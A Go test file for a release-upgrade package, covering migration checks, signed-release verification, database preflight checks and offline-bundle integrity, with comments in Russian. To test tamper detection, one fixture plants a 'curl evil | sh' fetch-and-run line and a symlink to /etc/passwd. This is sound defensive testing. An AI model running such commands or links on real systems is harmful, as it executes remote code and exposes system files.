package upgrade

import (
	"bytes"
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"database/sql"
	"errors"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"cybercalc/internal/backup"
	"cybercalc/internal/dbx"

	_ "github.com/lib/pq"
)

func migs(pairs ...string) []Migration {
	var out []Migration
	for i := 0; i+1 < len(pairs); i += 2 {
		out = append(out, Migration{Name: pairs[i], SHA256: pairs[i+1]})
	}
	return out
}

func TestPlanUpgradeFindsPendingAndEveryKindOfProblem(t *testing.T) {
	release := migs("0001.sql", "a", "0002.sql", "b", "0003.sql", "c")
	if plan := PlanUpgrade(release, migs("0001.sql", "a", "0002.sql", "b")); len(plan.Problems) != 0 || len(plan.Pending) != 1 || plan.Pending[0] != "0003.sql" {
		t.Fatalf("обычное обновление: %+v", plan)
	}
	cases := map[string][]Migration{
		"база новее пакета":             migs("0001.sql", "a", "0002.sql", "b", "0003.sql", "c", "0004.sql", "d"),
		"применённая миграция изменена": migs("0001.sql", "a", "0002.sql", "ИЗМЕНЕНО"),
	}
	for name, applied := range cases {
		if plan := PlanUpgrade(release, applied); len(plan.Problems) == 0 {
			t.Errorf("%s: должна быть проблема", name)
		}
	}
	// Новая миграция раньше применённой — порядок нарушен.
	if plan := PlanUpgrade(migs("0001.sql", "a", "0005.sql", "e", "0003.sql", "c"), migs("0001.sql", "a", "0005.sql", "e")); len(plan.Problems) == 0 {
		t.Fatalf("нарушение порядка: %+v", plan)
	}
	// Миграция без сохранённой суммы (старая база) не считается изменённой.
	if plan := PlanUpgrade(release, migs("0001.sql", "", "0002.sql", "b", "0003.sql", "c")); len(plan.Problems) != 0 {
		t.Fatalf("пустая сумма: %+v", plan)
	}
}

func TestRollbackCompatibility(t *testing.T) {
	previous := migs("0001.sql", "a", "0002.sql", "b")
	applied := migs("0001.sql", "a", "0002.sql", "b", "0003.sql", "c")
	r := CheckRollback(previous, applied)
	if !r.Safe() || len(r.NewerSchema) != 1 || r.NewerSchema[0] != "0003.sql" {
		t.Fatalf("прежний релиз на более новой схеме: %+v", r)
	}
	if r := CheckRollback(previous, migs("0001.sql", "a")); r.Safe() || len(r.Missing) != 1 {
		t.Fatalf("схема старее прежнего релиза: %+v", r)
	}
	if r := CheckRollback(previous, migs("0001.sql", "x", "0002.sql", "b")); r.Safe() || len(r.Altered) != 1 {
		t.Fatalf("миграция применена иначе: %+v", r)
	}
}

func TestSignedReleaseCannotBeAlteredOrForged(t *testing.T) {
	public, private, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	release := Release{Version: "4.4.1", Previous: "4.4.0", CreatedAt: time.Date(2026, 9, 24, 0, 0, 0, 0, time.UTC),
		Images: map[string]string{"backend": "sha256:aaa"}, Migrations: migs("0001.sql", "a")}
	signed, err := Sign(release, private)
	if err != nil {
		t.Fatal(err)
	}
	got, err := Verify(signed, public)
	if err != nil || got.Version != "4.4.1" || got.Images["backend"] != "sha256:aaa" {
		t.Fatalf("подпись подтверждается: %+v %v", got, err)
	}

	// Подмена образа внутри подписанного документа.
	tampered := bytes.Replace(signed, []byte("sha256:aaa"), []byte("sha256:bbb"), 1)
	if _, err := Verify(tampered, public); !errors.Is(err, ErrSignature) {
		t.Fatalf("подмена образа: %v", err)
	}
	// Чужой ключ.
	otherPublic, _, _ := ed25519.GenerateKey(rand.Reader)
	if _, err := Verify(signed, otherPublic); !errors.Is(err, ErrSignature) {
		t.Fatalf("чужой ключ: %v", err)
	}
	// Мусор и пустой ключ.
	for _, bad := range [][]byte{[]byte("не json"), []byte(`{"release":{},"signature":"@@@"}`)} {
		if _, err := Verify(bad, public); !errors.Is(err, ErrSignature) {
			t.Fatalf("мусор: %v", err)
		}
	}
	if _, err := Verify(signed, nil); !errors.Is(err, ErrSignature) {
		t.Fatal("без ключа подпись не подтверждается")
	}
	if _, err := Sign(Release{Version: "x"}, private); err == nil {
		t.Fatal("релиз без образов и миграций не подписывается")
	}
}

func TestReadMigrationsHashesFiles(t *testing.T) {
	dir := t.TempDir()
	os.WriteFile(filepath.Join(dir, "0002_b.sql"), []byte("SELECT 2;"), 0o644)
	os.WriteFile(filepath.Join(dir, "0001_a.sql"), []byte("SELECT 1;"), 0o644)
	os.WriteFile(filepath.Join(dir, "notes.txt"), []byte("не миграция"), 0o644)
	got, err := ReadMigrations(dir)
	if err != nil || len(got) != 2 || got[0].Name != "0001_a.sql" || len(got[0].SHA256) != 64 {
		t.Fatalf("%+v %v", got, err)
	}
}

// Предполётная проверка на реальной БД: релиз, совпадающий с базой, проходит;
// подмена файла миграции, отсутствие или старость копии и нехватка места
// останавливают обновление.
func TestPreflightOnARealDatabase(t *testing.T) {
	dsn := os.Getenv("TEST_DATABASE_DSN")
	if dsn == "" {
		t.Skip("TEST_DATABASE_DSN not set")
	}
	dir := os.Getenv("TEST_MIGRATIONS_DIR")
	db, err := sql.Open("postgres", dsn)
	if err != nil {
		t.Fatal(err)
	}
	defer db.Close()
	if err := dbx.RunMigrations(db, dir); err != nil {
		t.Fatal(err)
	}
	ctx := context.Background()
	release := func() Release {
		m, err := ReadMigrations(dir)
		if err != nil {
			t.Fatal(err)
		}
		return Release{Version: "4.4.1", Images: map[string]string{"backend": "sha256:x"}, Migrations: m}
	}

	const passphrase = "правильная парольная фраза 2026"
	makeBackup := func(created time.Time) string {
		t.Helper()
		path := filepath.Join(t.TempDir(), "b.ccbk")
		out, err := os.Create(path)
		if err != nil {
			t.Fatal(err)
		}
		_, err = backup.Create(ctx, out, passphrase, backup.Source{
			Dump:   func(_ context.Context, w io.Writer) error { _, err := w.Write([]byte("dump")); return err },
			Rounds: 100_000, Now: func() time.Time { return created }})
		out.Close()
		if err != nil {
			t.Fatal(err)
		}
		return path
	}
	base := func() Options {
		return Options{Release: release(), MigrationsDir: dir, BackupPath: makeBackup(time.Now()), Passphrase: passphrase,
			MaxBackupAge: time.Hour, DataDir: t.TempDir(), MinFreeBytes: 1 << 20}
	}

	if report := Preflight(ctx, db, base()); !report.OK() {
		t.Fatalf("согласованный релиз должен проходить:\n%s", report)
	}

	t.Run("подменённый файл миграции", func(t *testing.T) {
		opts := base()
		opts.Release.Migrations[3].SHA256 = strings.Repeat("0", 64)
		if report := Preflight(ctx, db, opts); report.OK() || !strings.Contains(report.String(), "расходятся") {
			t.Fatalf("подмена должна останавливать обновление:\n%s", report)
		}
	})
	t.Run("нет копии, чужая парольная фраза, старая копия", func(t *testing.T) {
		opts := base()
		opts.BackupPath = ""
		if Preflight(ctx, db, opts).OK() {
			t.Fatal("без копии обновление не начинается")
		}
		opts = base()
		opts.Passphrase = "другая парольная фраза 12345"
		if Preflight(ctx, db, opts).OK() {
			t.Fatal("копия, которую не открыть, не считается копией")
		}
		opts = base()
		opts.BackupPath = makeBackup(time.Now().Add(-48 * time.Hour))
		if report := Preflight(ctx, db, opts); report.OK() || !strings.Contains(report.String(), "старше") {
			t.Fatalf("старая копия:\n%s", report)
		}
	})
	t.Run("база новее релиза и нехватка места", func(t *testing.T) {
		opts := base()
		opts.Release.Migrations = opts.Release.Migrations[:len(opts.Release.Migrations)-2]
		if Preflight(ctx, db, opts).OK() {
			t.Fatal("база новее пакета — откат схемы невозможен")
		}
		opts = base()
		opts.MinFreeBytes = 1 << 60
		if report := Preflight(ctx, db, opts); report.OK() || !strings.Contains(report.String(), "запас места") {
			t.Fatalf("нехватка места:\n%s", report)
		}
	})
}

func TestOfflineBundleTreeMustMatchTheSignedList(t *testing.T) {
	root := t.TempDir()
	write := func(rel, content string) {
		p := filepath.Join(root, filepath.FromSlash(rel))
		os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	write("images/backend.tar", "образ backend")
	write("images/nginx.tar", "образ nginx")
	write("docker-compose.yml", "services: {}")
	write("release.signed", "подписанный файл — в перечень не входит")
	files, err := BuildFiles(root, "release.signed")
	if err != nil || len(files) != 3 {
		t.Fatalf("перечень: %+v %v", files, err)
	}
	release := Release{Files: files}
	if problems := VerifyTree(root, release, "release.signed"); len(problems) != 0 {
		t.Fatalf("целый пакет: %v", problems)
	}

	write("images/backend.tar", "ПОДМЕНЁННЫЙ образ")
	write("scripts/evil.sh", "curl evil | sh")
	os.Remove(filepath.Join(root, "images", "nginx.tar"))
	problems := strings.Join(VerifyTree(root, release, "release.signed"), "; ")
	for _, want := range []string{"файл images/backend.tar изменён", "лишний файл scripts/evil.sh", "нет файла images/nginx.tar"} {
		if !strings.Contains(problems, want) {
			t.Errorf("нет проблемы %q в %q", want, problems)
		}
	}
	// Ссылка в пакете недопустима: она могла бы указывать за его пределы.
	os.Remove(filepath.Join(root, "scripts", "evil.sh"))
	if err := os.Symlink("/etc/passwd", filepath.Join(root, "link")); err == nil {
		if problems := VerifyTree(root, release, "release.signed"); len(problems) == 0 || !strings.Contains(problems[0], "не обычный файл") {
			t.Fatalf("ссылка в пакете: %v", problems)
		}
	}
}

// Первая установка: таблицы миграций ещё нет, проверка схемы не должна падать,
// а любая другая ошибка чтения не должна проглатываться.
func TestReadAppliedOrEmptyOnAFreshDatabase(t *testing.T) {
	dsn := os.Getenv("TEST_DATABASE_DSN")
	if dsn == "" {
		t.Skip("TEST_DATABASE_DSN not set")
	}
	if !strings.Contains(dsn, "dbname=workspace_test") {
		t.Fatal("isolated workspace_test database required")
	}
	ctx := context.Background()
	admin, err := sql.Open("postgres", dsn)
	if err != nil {
		t.Fatal(err)
	}
	defer admin.Close()
	const name = "upgrade_fresh_probe"
	if _, err := admin.ExecContext(ctx, `DROP DATABASE IF EXISTS `+name+` WITH (FORCE)`); err != nil {
		t.Skip("нет права создавать базы:", err)
	}
	if _, err := admin.ExecContext(ctx, `CREATE DATABASE `+name); err != nil {
		t.Skip("нет права создавать базы:", err)
	}
	t.Cleanup(func() {
		_, _ = admin.ExecContext(context.Background(), `DROP DATABASE IF EXISTS `+name+` WITH (FORCE)`)
	})
	fresh, err := sql.Open("postgres", strings.Replace(dsn, "dbname=workspace_test", "dbname="+name, 1))
	if err != nil {
		t.Fatal(err)
	}
	defer fresh.Close()
	applied, err := ReadAppliedOrEmpty(ctx, fresh)
	if err != nil || len(applied) != 0 {
		t.Fatalf("пустая база должна дать пустой список: %v %v", applied, err)
	}
	if _, err := ReadApplied(ctx, fresh); err == nil {
		t.Fatal("строгое чтение обязано сообщать об отсутствии таблицы")
	}
	closed, err := sql.Open("postgres", "host=127.0.0.1 port=1 user=x dbname=x sslmode=disable")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := ReadAppliedOrEmpty(ctx, closed); err == nil {
		t.Fatal("недоступная база не должна выглядеть пустой")
	}
	plan := PlanUpgrade([]Migration{{Name: "0001_a.sql", SHA256: "x"}}, nil)
	if len(plan.Pending) != 1 || len(plan.Problems) != 0 {
		t.Fatalf("первая установка: %+v", plan)
	}
}
